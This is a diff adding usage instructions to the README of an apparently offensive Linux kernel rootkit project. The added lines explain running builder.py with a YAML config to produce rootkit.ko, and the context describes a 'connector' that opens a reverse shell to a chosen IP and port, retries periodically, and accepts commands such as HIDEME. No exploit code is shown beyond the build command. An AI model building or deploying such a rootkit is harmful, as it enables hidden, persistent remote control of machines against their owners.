@@ -38,6 +38,13 @@ shells:
     - "sleep 1000"
 ```
 
+After you create your yaml just run the builder.py
+
+```sh
+$ python3 builder.py --config config.yml
+```
+And rootkit.ko will be created.
+
 another way to execute your hiding or shell script is connector, if you enable your connector, rev-sell connection is created to your defined IP and Port, after this it will try open connection every x second. After connection is opened multiple commands can be send:
 
 * HIDEME
